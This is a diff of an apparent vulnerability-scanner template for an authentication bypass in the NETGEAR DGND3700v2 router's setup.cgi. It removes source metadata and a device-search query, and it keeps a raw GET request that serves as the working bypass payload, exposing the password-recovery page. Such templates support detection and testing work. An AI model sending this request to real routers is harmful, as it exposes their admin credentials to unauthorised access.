@@ -3,14 +3,8 @@ info:
   name: NETGEARDGND3700v2路由器setup.cgi接口身份认证绕过漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/7a67e195a86f6b9d6c4cbeed329fd75c
-
-    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: unauth,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 7a67e195a86f6b9d6c4cbeed329fd75c
-    fofa: + hunter`web.title="DGND3700v2"`
 http:
 - raw:
   - 'GET /setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm HTTP/1.1
